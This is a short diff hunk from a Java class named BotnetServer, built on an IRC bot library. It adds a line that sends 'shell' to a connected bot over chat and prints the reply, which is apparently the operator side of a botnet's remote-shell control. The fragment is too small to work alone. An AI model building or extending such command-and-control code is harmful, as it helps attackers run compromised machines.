@@ -444,6 +444,7 @@ public class BotnetServer extends PircBot {
 			Scanner shellout = new Scanner(chat.getBufferedReader());
 			
 			try {
+				chat.sendLine("shell");
 				// TODO: decrypt this
 				System.out.print(shellout.nextLine());
 				//String msg = shellout.nextLine();
